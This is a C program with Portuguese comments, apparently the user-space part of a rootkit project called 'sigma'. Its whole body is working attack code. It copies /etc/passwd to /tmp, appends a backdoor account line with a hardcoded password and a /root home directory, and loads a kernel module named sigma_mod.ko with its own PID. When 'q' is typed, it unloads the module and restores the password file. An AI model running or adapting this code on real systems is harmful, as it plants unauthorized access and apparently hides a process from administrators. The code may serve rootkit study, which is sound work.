#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


// Operações de ataque (1,2,3,4)

// Operação 1
// copia /etc/passwd pro /tmp/passwd, adiciona a linha de auth
#define TARGET_PASSWD "/etc/passwd"
#define TEMP_PASSWD "/tmp/passwd"
#define FAKE_AUTH "sigma:abc123:2000:2000:sigma:/root:bash"

// adicionando linha de auth
int op1_add_auth_line(const char* target_file, const char* line_to_add){
  // abre o /etc/passwd e faz a checagem de erro
  FILE * targetFileStream = fopen(target_file, "a"); // modo anexo 
  if (targetFileStream == NULL){
    fprintf(stderr, "Erro, não foi possível abrir o  %s na linha de anexo, erro = %d\n",
	    target_file, errno);
    return -1; // erro indicado
  }
  else{ // successo
    fprintf(targetFileStream,"%s\n", line_to_add);
  }
  // fecha o arquivo
  if (fclose(targetFileStream) != 0){
    fprintf(stderr, "Erro, não pode fechar o arquivo %s na linha de anexo.\n",
	    target_file);
  }
  return 0; // retorna successo
}


// copia o /etc/passwd pro /tmp/passwd
ssize_t op1_copy(char * source, char * destination){
  
  int source_fd = open(source, O_RDONLY); // source filedescriptor
  int dest_fd = open(destination, O_CREAT | O_WRONLY | O_TRUNC, 0600);
  // check open call
  if ((source_fd < 0) || (dest_fd < 0)){
    fprintf(stderr, "Erro, não foi possível abrir o código fonte do %s"
	    "%s\n", source, destination);
    return -1; // erro indicado
  }
  ssize_t success_indicator;

  char buffer[8192]; 
  // loop
  for(;;){
    success_indicator = read(source_fd, buffer, sizeof(buffer));
    if (success_indicator < 0){
      fprintf(stderr, "Erro ao ler o código fonte de %s\n", source);
      break; // break e retorna erro -1
    }

    else if(success_indicator == 0){
      break; // break e retorna sucesso
    }

    success_indicator = write(dest_fd, buffer, success_indicator);
    // o success_indicator tem que ter o numero certo de bytes na primeira passagem
    if (success_indicator < 0){
      fprintf(stderr, "Erro ao escrever no arquivo %s\n", destination);
      break; // break e retorna erro com -1
    }
  }

  // fecha
  close(source_fd);
  close(dest_fd);
  return success_indicator;
}

// Operação 2 (carregando a porra do módulo!) 
int op2_begin_attack(){
  char * args[4];
  char sigma_pid[64];
  memset(sigma_pid, 0, sizeof(sigma_pid));
  
  snprintf(sigma_pid, sizeof(sigma_pid), "sigma_pid=%d", getpid());

  if (op1_copy(TARGET_PASSWD, TEMP_PASSWD) < 0){
    // erro
    return -1;
  }
  if (op1_add_auth_line(TARGET_PASSWD, FAKE_AUTH) < 0){
    // erro
    return -1;
  }
  args[0] = "insmod";
  args[1] = "sigma_mod.ko";
  args[2] = sigma_pid;
  args[3] = NULL;
  
  int status;
  pid_t child;

  if ((child = fork()) < 0){
    // error com child process
    fprintf(stderr, "Child process erro\n");
    return -1;
  }
  if (child == 0){ //  processo child
    // executa o insmod
    
    printf("No child process, pid= %d\n", getpid());
    int child_return_val = execvp(args[0], args);

    if (child_return_val < 0){
      fprintf(stderr, "Erro executando o child process, errno = %d\n", errno);
      exit(EXIT_FAILURE);
    }
  }
  else{ // processo pai
   
    //printf("No processo pai, pid = %d\n", getpid());
    pid_t parent = waitpid(child, &status, WUNTRACED | WCONTINUED);
    
    if (parent < 0){
      fprintf(stderr, "Erro ao esperar o child process, errno = %d\n", errno);
      return -1;
    }
    else{
      //printf("Child process finalizado, modulo carregado!!!!!!!\n");
    }
  }
  return 0;
}


// Operação 3 (main loop)


// Operação 3( descarrega modulo e restaura o /etc/passwd)
int op4_end_attack(){
  char * args[3];

  args[0] = "rmmod";
  args[1] = "sigma_mod.ko";
  args[2] = NULL;
  
  int status;
  pid_t child;
  if ((child = fork()) < 0){
    // error with child process
    fprintf(stderr, "Erro no child process\n");
    return -1;
  }
  if (child == 0){ // child process
    // executa insmod command

    //printf("no child process, pid = %d\n", getpid());
    int child_return_val = execvp(args[0], args);

    if (child_return_val < 0){
      fprintf(stderr, "Erro executando o child process, errno = %d\n", errno);
      exit(EXIT_FAILURE);
    }
  }
  else{ // processo pai
    
    //printf("no processo pai, pid = %d\n", getpid());
    pid_t parent = waitpid(child, &status, WUNTRACED | WCONTINUED);
    
    if (parent < 0){
      fprintf(stderr, "Error ao esperar o child process, errno = %d\n", errno);
      return -1;
    }
    else{
      //printf("Child process completo, modulo descarregado\n");
    }
  }
  // copia de volta o arquivo /etc/passwd
  if (op1_copy(TEMP_PASSWD, TARGET_PASSWD) < 0){
    // erro
    return -1;
  }
  return 0;
}




int main(int argc, char* argv[]){


  printf("sigma_process pid = %d\n", getpid()); // add 04/10 change 
  
  
  if (op2_begin_attack() != 0){
    fprintf(stderr,"O ataque falhou, errno = %d\n", errno);
    exit(EXIT_FAILURE);
  }
  
  for(;;){  // Operaçao 3, testando atividade maliciosa
    char char_in;
    printf("sigma_process esta rodando... $: ");
    char_in = getchar();
    printf("sigma_process esta rodando... $: \n");
    if (char_in == 'q'){ // sai
  
      if (op4_end_attack() != 0){
	fprintf(stderr, "Ataque limpo falhou, errno = %d\n", errno);
	exit(EXIT_FAILURE);
      }
      printf("saindo... \n");
      break;
    }
  }

  return EXIT_SUCCESS;
}
